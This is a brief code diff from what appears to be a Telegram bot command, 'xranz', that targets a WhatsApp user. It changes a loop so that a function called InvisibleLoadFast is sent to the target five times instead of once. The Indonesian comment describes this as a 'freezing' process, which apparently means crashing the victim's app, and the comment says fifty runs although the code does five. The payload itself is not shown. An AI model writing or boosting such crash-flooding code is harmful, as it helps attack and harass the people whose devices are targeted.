@@ -1459,7 +1459,7 @@ bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 1; i++) {
+  for (let i = 0; i < 5; i++) {
         await InvisibleLoadFast(target, { ptcp: true });
         
   }
